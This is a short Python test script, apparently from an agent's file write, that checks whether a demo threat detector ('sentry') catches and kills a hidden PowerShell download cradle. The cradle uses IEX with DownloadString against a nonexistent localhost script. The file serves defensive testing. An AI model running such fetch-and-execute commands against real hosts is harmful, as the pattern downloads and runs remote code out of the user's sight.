#!/usr/bin/env python3
"""Test script to verify threat detection end-to-end."""

import subprocess
import time
import sys
import os

def test_threat_detection():
    """Test that sentry detects launched threats."""
    print("[TEST] Starting threat detection test...")

    # Launch a threat similar to what attack_app.py does
    print("[TEST] Launching PowerShell cradle threat...")

    cmd_to_run = 'powershell.exe -NoP -WindowStyle Hidden "IEX (New-Object Net.WebClient).DownloadString(\'http://127.0.0.1/nonexistent-malware.ps1\')"'

    DETACHED_PROCESS = 0x00000008
    process = subprocess.Popen(cmd_to_run, shell=True, creationflags=DETACHED_PROCESS)

    pid = process.pid
    print(f"[TEST] Launched threat with PID: {pid}")

    # Wait a bit for sentry to detect it
    print("[TEST] Waiting 5 seconds for sentry detection...")
    time.sleep(5)

    # Check if process is still running (sentry might have killed it)
    try:
        process.poll()
        if process.returncode is None:
            print(f"[TEST] Process {pid} is still running - sentry may not have detected it")
        else:
            print(f"[TEST] Process {pid} was terminated (return code: {process.returncode}) - sentry likely detected and killed it")
    except:
        print(f"[TEST] Could not check process {pid} status")

    print("[TEST] Test complete. Check defender app logs for detection.")

if __name__ == "__main__":
    test_threat_detection()</content>
<parameter name="filePath">c:\Users\isaal\demo-sentinelonex\test_threat_flow.py